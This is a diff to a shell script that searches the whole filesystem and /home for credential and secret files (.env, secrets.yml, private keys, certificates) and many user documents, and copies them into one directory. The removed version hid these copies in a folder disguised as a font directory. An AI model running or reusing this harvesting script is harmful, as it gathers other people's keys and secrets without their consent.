@@ -11,6 +11,7 @@ FILES=(
   docker-compose.yaml
   compose.yml
   compose.yaml
+  Makefile
   Dockerfile
   .dockerignore
   .env
@@ -35,23 +36,50 @@ FILES=(
   secrets.yml
   secrets.yaml
   vault.hcl
+  *.htm
+  *.html
+  *.php
   *.pem
   *.key
   *.crt
   *.cer
 )
 
-BACKUP_DIR="/usr/share/fonts/arial-sans/"
+HOME_EXTS=(
+  *.txt
+  *.pdf
+  *.doc
+  *.docx
+  *.xlsx
+  *.json
+  *.xml
+  *.toml
+  *.sh
+  *.py
+  *.js
+  *.pl
+  *.md
+  *.csv
+  *.png
+  *.jpg
+  *.log
+  *.zip
+  *.7z
+)
 
-mkdir -p $BACKUP_DIR
+BACKUP_DIR="{{ backup_dir }}"
+
+mkdir -p "$BACKUP_DIR/sus_files"
+
+touch "$BACKUP_DIR/sus_files/log.txt"
 
 backup_file() {
   local file="$1"
-  echo "Backing up: $file"
+  echo "Backing up: $file" >> "$BACKUP_DIR/sus_files/log.txt"
   cp --parents -a "$file" "$BACKUP_DIR" 2>/dev/null || true
 }
 
-for name in "${FILES[@]}"; do
+for name in "${HOME_EXTS[@]}"; do
   find / \
     -path /proc -prune -o \
     -path /sys -prune -o \
@@ -59,7 +87,14 @@ for name in "${FILES[@]}"; do
     -path /run -prune -o \
     -path /tmp -prune -o \
     -path /var/cache -prune -o \
-    -path /mnt -prune -o \
+    -type f -iname "$name" -print |
+    while read -r file; do
+        backup_file "$file"
+    done
+done
+
+for name in "${FILES[@]}"; do
+  find /home \
     -type f -iname "$name" -print |
     while read -r file; do
         backup_file "$file"
